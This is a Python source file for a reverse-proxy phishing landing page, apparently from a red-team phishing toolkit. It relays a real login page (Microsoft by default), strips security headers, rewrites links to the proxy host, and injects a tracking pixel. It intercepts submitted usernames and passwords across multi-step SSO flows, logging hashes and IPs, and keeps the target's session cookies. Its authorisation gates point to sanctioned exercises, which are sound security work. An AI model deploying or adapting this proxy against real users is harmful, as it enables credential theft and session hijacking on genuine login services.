#!/usr/bin/env python3
"""phish-proxy — 反向代理着陆页(处理 JS/SSO/多步登录/凭据拦截)
核心思路: 不是克隆 HTML,而是做 MITM 反向代理——
  1. 用户访问 https://你的域/ → 代理把请求转发到 https://目标真实登录页/
  2. 所有 CSS/JS/图片/字体从目标域加载(浏览器正常渲染,不缺资源)
  3. 表单提交(POST)被拦截: 凭据哈希记录 → 哈希后转发到目标(或返回成功页)
  4. 支持 SSO 多步流(用户名→密码→MFA),每步都拦截
用法:
  phish-proxy.py serve --listen :8080 --target https://login.target.com \
      [--db <数据根>/tools/phish/track.json]
"""
import sys, os, json, time
from http.server import HTTPServer, BaseHTTPRequestHandler


from urllib.parse import urlparse, parse_qs
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from _common import _data_root, scope_gate_full, edusrc_gate_phish as edusrc_gate, cred_hash as _cred_hash, RESP_STRIP_HEADERS  # CS69-2/CS72-3: 导入归顶


# CS8-P1-4: 缺省与链路同源(phish-send/phish-track/漏斗都指向数据根
# tools/phish——此前 /tmp 使经代理的 click/submit 对 campaigns 面板
# 永久不可见)。容器位 /opt/tools, 宿主位 SPECTRE_DATA_DIR。

DB_FILE = os.path.join(_data_root(), 'phish/track.json')  # CS12-N1: 批次 R 恢复时误删, 补回

def _multi_setcookie(hdrs, raw_headers):
    # R32D93-N1: dict(headers) 折叠重复键——多值 Set-Cookie 三吞二,
    # 会话捕获面永失首表外 cookie。list 传递, _respond 逐条展开。
    sc = raw_headers.get_all('Set-Cookie') if hasattr(raw_headers, 'get_all') else None
    if sc and len(sc) > 1:
        # CS77-1/CS78-4: 先弹尽大小写变体原键再写规范键——本文件真实
        # 症状是 _respond 迭代双键致首条 Set-Cookie 双份出站。
        for hk in [k for k in hdrs if k.lower() == 'set-cookie']:
            hdrs.pop(hk, None)
        hdrs['Set-Cookie'] = sc
    return hdrs


def load_db():
    try: return json.load(open(DB_FILE))
    except: return {'events': []}

def save_db(db):
    json.dump(db, open(DB_FILE, 'w'), indent=1, ensure_ascii=False)

def add_event(kind, uid, extra=None):  # CS72-4: db 死参删(锁内重读, 调用方 load_db 为死读)
    # R17-F1: V6b 排他锁读改写——proxy 是事件库四写入方中唯一无锁者
    # (track V6 只修了自己侧; phishlet-proxy F36 不变性: 同库并发方
    # 必须持同一把锁, PoC 丢 599/600)。
    ev = {'kind': kind, 'uid': uid, 'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
    if extra: ev.update(extra)
    import fcntl
    # R32D88-F1(P0): 父目录由 serve 启动自检预建(CS72-6: 每事件重复
    # makedirs 删, 单点保证; 此前全新安装 open(lock) 即崩)。
    with open(DB_FILE + '.lock', 'w') as lf:
        fcntl.flock(lf, fcntl.LOCK_EX)
        try:
            cur = load_db()
            cur.setdefault('events', []).append(ev)
            save_db(cur)
        finally:
            fcntl.flock(lf, fcntl.LOCK_UN)
    print(f'[proxy] {kind} uid={uid}', flush=True)

class ProxyHandler(BaseHTTPRequestHandler):
    # R32D90-OBS2: 匿名化自动 Server 头(send_response 注入缺省
    # BaseHTTP/Python 栈指纹; 类属性覆盖优于手动加头——后者双份)。
    server_version = 'phish-proxy/1'
    sys_version = ''

    def version_string(self):
        return self.server_version  # CS74-N2: 消尾随空格(gateway 先例)

    # Class-level config (set by serve())
    target_base = 'https://login.microsoft.com'

    def proxy_request(self, method='GET', body=None):
        """Forward request to target, return response"""
        url = self.target_base + self.path
        headers = {}
        for key in ['Accept', 'Accept-Language', 'Accept-Encoding', 'User-Agent',
                    'Content-Type', 'Cookie', 'Referer']:
            if key in self.headers:
                val = self.headers[key]
                if key == 'Referer':
                    val = val.replace(self.headers.get('Host', ''), urlparse(self.target_base).netloc)
                # (CS66-F12: 此前 Cookie 分支 val=val 无操作+注释失实已删)
                headers[key] = val

        # Don't send Accept-Encoding gzip (we need to read/modify the response)
        headers['Accept-Encoding'] = 'identity'

        try:
            req = Request(url, data=body, headers=headers, method=method)
            resp = urlopen(req, timeout=15)
            return resp.status, _multi_setcookie(dict(resp.headers), resp.headers), resp.read()
        except HTTPError as e:
            return e.code, _multi_setcookie(dict(e.headers), e.headers), e.read()
        except URLError as e:
            return 502, {}, f'Proxy error: {e}'.encode()

    def process_response(self, status, headers, body, content_type=''):
        """Modify response: strip security headers, rewrite URLs, inject tracking"""
        # Remove security headers that prevent embedding/interaction
        # R17-F5: 大小写不敏感——dict(resp.headers) 保留线上原样, 真实
        # 目标常发小写头, 字面 pop 静默未命中使核心功能失效。
        STRIP = RESP_STRIP_HEADERS  # CS72-3: 单源 _common(两代理同集)
        for h in [k for k in headers if k.lower() in STRIP]:
            headers.pop(h, None)

        # Rewrite absolute URLs pointing to target → our proxy
        if content_type and ('text/html' in content_type.lower() or 'javascript' in content_type.lower()):  # R32D89: 值大小写不敏感
            body_str = body.decode('utf-8', errors='replace')
            target_host = urlparse(self.target_base).netloc
            our_host = self.headers.get('Host', 'localhost')
            # Rewrite links/assets to go through proxy
            body_str = body_str.replace(f'https://{target_host}', f'http://{our_host}')
            body_str = body_str.replace(f'//{target_host}', f'//{our_host}')
            # Inject tracking pixel before </body>
            uid = 'proxy'  # 设计选择: 代理腿 uid 固定标识来源; 具体身份由 track 端按 IP/时间聚合
            pixel = f'<img src="http://{our_host}/o/{uid}.gif" style="display:none;width:1px;height:1px;">'
            if '</body>' in body_str:
                body_str = body_str.replace('</body>', f'{pixel}</body>')
            body = body_str.encode('utf-8')

        return status, headers, body

    def do_GET(self):
        u = urlparse(self.path)

        # Tracking pixel
        if u.path.startswith('/o/') and u.path.endswith('.gif'):
            uid = u.path.split('/')[2].replace('.gif', '')
            add_event('open', uid, {'ua': self.headers.get('User-Agent', ''), 'ip': self.client_address[0]})
            import base64
            gif = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.send_header('Content-Length', str(len(gif)))
            self.end_headers()
            self.wfile.write(gif)
            return

        # Click tracking (redirect to proxied target)
        if u.path.startswith('/r/'):
            uid = u.path.split('/')[2]
            add_event('click', uid, {'ua': self.headers.get('User-Agent', ''), 'ip': self.client_address[0]})
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            return

        # Everything else: proxy to target
        status, headers, body = self.proxy_request('GET')
        ct = next((v for k, v in headers.items() if k.lower() == 'content-type'), '')  # R32D88-F2: 大小写不敏感
        status, headers, body = self.process_response(status, headers, body, ct)

        self._respond(status, headers, body)

    def _respond(self, status, headers, body):
        # CS69-5/CS70-1: respond 诗节×2 收口(跳过逐跳头+重算长度)——
        # DI 批次替换误把本函数体也换成自调用(RecursionError), 此为真身。
        self.send_response(status)
        # R32D88-F4: 剥 origin Server/Date(send_response 自注入, 此前
        # 转发全头致双份 Server/Date 畸形应答+泄漏代理栈)。
        for k, v in headers.items():
            if k.lower() not in ('transfer-encoding', 'content-length', 'server', 'date'):
                for one in (v if isinstance(v, list) else [v]):  # R32D93-N1: 多值逐条
                    self.send_header(k, one)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        u = urlparse(self.path)
        # R17-F2: V3 同款校验——非数字 ValueError/负值 read(-n) 读到
        # EOF 永久 wedge 单线程服务器/无上界读。修复只做了 track 侧。
        try:
            length = int(self.headers.get('Content-Length', 0) or 0)
        except (ValueError, TypeError):
            self.send_response(400); self.end_headers()
            return
        if length < 0 or length > 1_048_576:
            self.send_response(413); self.end_headers()
            return
        body = self.rfile.read(length) if length else b''
        body_str = body.decode('utf-8', errors='replace')
        qs = parse_qs(body_str)

        # Intercept form submissions (credential capture)
        # Look for common password field names
        password_fields = ['password', 'passwd', 'pass', 'pwd', 'Password',
                          'loginfmt', 'login', 'CredentialPassword']
        email_fields = ['email', 'username', 'user', 'login', 'Email', 'loginfmt',
                       'userPrincipalName', 'upn']

        captured_email = None
        captured_password = None

        for field in email_fields:
            if field in qs:
                captured_email = qs[field][0]
                break
        for field in password_fields:
            if field in qs:
                captured_password = qs[field][0]
                break

        if captured_password:
            # Hash immediately (NEVER store plaintext)
            # CS66-F5/CS67-2: cred_hash 单源 _common.cred_hash(此前
            # 本地 JSON 公式与 track 的 parse_qs 列表值口径仍分裂)。
            cred_hash = _cred_hash({'email': captured_email, 'password': captured_password})
            add_event('submit', 'proxy', {
                'cred_hash': cred_hash,
                'email_domain': captured_email.split('@')[1] if '@' in (captured_email or '') else '',
                'ip': self.client_address[0],
            })
            # After capturing, redirect to a "success" page or the real target
            self.send_response(302)
            self.send_header('Location', '/success')
            self.end_headers()
            return

        # Non-credential POST: forward to target (e.g., CSRF token fetch, SSO handshake)
        status, headers, body = self.proxy_request('POST', body)
        ct = next((v for k, v in headers.items() if k.lower() == 'content-type'), '')  # R32D88-F2: 大小写不敏感
        status, headers, body = self.process_response(status, headers, body, ct)
        self._respond(status, headers, body)

    def log_message(self, *a):
        pass

def serve(listen, target, db_file=None):
    edusrc_gate((target,))
    scope_gate_full()  # F10: 完整授权门(targets+exercise+window 三必填, CS37-F5)
    global DB_FILE
    if db_file:
        DB_FILE = db_file

    host, _, port = listen.rpartition(':')
    ProxyHandler.target_base = target.rstrip('/')

    # R32D94-OBS1: 端口守卫先于任何横幅(此前先打 :abc 再拒)。
    port_s = listen.rpartition(':')[2] or '8080'
    if not (port_s.isascii() and port_s.isdigit()) or not (0 < int(port_s) < 65536):  # R32D95-N2: 范围
        print(f'--listen/--port 端口须 1-65535 数字: {port_s}', file=sys.stderr); sys.exit(2)
    print(f'[phish-proxy] {listen} → {target}', flush=True)
    # R32D88-F1: 静态'Credentials intercepted'横幅改启动自检——凭据路
    # 径此前可崩(缺 makedirs)而横幅照打, 失实。
    try:
        os.makedirs(os.path.dirname(DB_FILE) or '.', exist_ok=True)
        # CS72-5: 探库本体(append 试开)——此前只探 .lock 过报。
        with open(DB_FILE, 'a'):
            pass
        with open(DB_FILE + '.lock', 'w') as lf:
            pass
        print(f'[phish-proxy] 事件库可写: {DB_FILE}(凭据落库即哈希, 明文即毁)', flush=True)
    except OSError as e:
        print(f'[phish-proxy] FATAL: 事件库不可写 {DB_FILE} — {e}', flush=True)
        sys.exit(1)
    # CS79-F1: 构造+serve_forever 同 try(对齐 phishlet——此前仅包
    # 构造, serve_forever 期 OSError 裸栈 rc=1, 同失败类两契约)。
    try:
        HTTPServer((host or '0.0.0.0', int(port or 8080)), ProxyHandler).serve_forever()
    except OSError as e:  # R32D95-N2: 主机名解析失败/运行期异常干净拒
        print(f'--listen 无法绑定 {listen}: {e}', file=sys.stderr); sys.exit(2)

if __name__ == '__main__':
    # R32D74-N1/CS55-F2: -h 永先(家族最高契约), 门在 -h 后、解析前
    # (畸形参 rc=2 先于 76 的族间不对称封堵)。
    if any(x in sys.argv[1:] for x in ('-h', '--help')):
        print(__doc__); sys.exit(0)
    edusrc_gate()
    # R32D42-P1/CS56-N1: 子命令归一——-h 已由上方门块处理(rc=0);
    # 未知/缺失子命令一律用法 rc=2。
    if len(sys.argv) < 2 or sys.argv[1] not in ('serve',):
        print(__doc__); sys.exit(2)
    if sys.argv[1] == 'serve':
        # R32D92-N1: 成对解析+未知旗标拒 rc=2(此前静默忽略)+--port 别名
        # (族内 phish-track 用 --port, 两形并收消不一致)。
        PAIR_FLAGS = ('--listen', '--port', '--target', '--db')
        toks, flags = sys.argv[2:], {}
        i = 0
        while i < len(toks):
            t = toks[i]
            if t in PAIR_FLAGS and i + 1 < len(toks):
                flags[t] = toks[i + 1]; i += 2
            else:
                print(f'未知/缺值参数: {t}(用法: -h)', file=sys.stderr); sys.exit(2)
        listen = flags.get('--listen') or (':' + flags['--port'] if '--port' in flags else ':8080')
        target = flags.get('--target') or 'https://login.microsoft.com'
        db = flags.get('--db')
        serve(listen, target, db)
